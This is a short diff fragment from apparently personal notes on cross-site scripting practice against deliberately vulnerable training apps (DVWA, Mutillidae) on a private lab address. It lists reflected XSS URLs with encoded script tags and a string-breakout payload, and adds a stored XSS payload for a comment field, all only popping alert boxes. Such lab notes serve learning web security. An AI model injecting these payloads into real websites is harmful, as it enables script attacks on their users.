@@ -10,3 +10,4 @@ http://192.168.1.123/dvwa/vulnerabilities/xss_r/?name=%3CSCript%3Ealert%28%22tes
 http://192.168.1.123/mutillidae/index.php?page=password-generator.php&username=%22;alert(%22test%22);//
 
 Stored XSS
+<script>alert("test")</script> in the comment
